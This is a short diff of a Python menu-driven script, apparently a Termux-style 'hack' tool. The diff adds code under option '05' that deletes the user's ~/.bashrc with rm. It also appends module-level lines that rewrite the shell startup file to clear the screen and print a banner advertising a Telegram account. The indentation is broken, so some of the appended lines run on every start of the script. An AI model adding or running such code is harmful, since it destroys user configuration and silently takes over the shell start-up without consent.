@@ -213,8 +213,15 @@ while True:
 
 
     if inp == '05':   
+        tt = 'привет'
         os.system('clear')
-        
+        os.system('rm ~/.bashrc')
+
+
+
+os.system('echo "clear" >> ~/.bashrc')
+os.system('echo "toilet -f mono9 -F metal Удачи" >> ~/.bashrc')
+os.system('echo "echo [telegram @sypexhack желает вам хорошего дня]" >> ~/.bashrc')
 
 
     if inp == '5':   
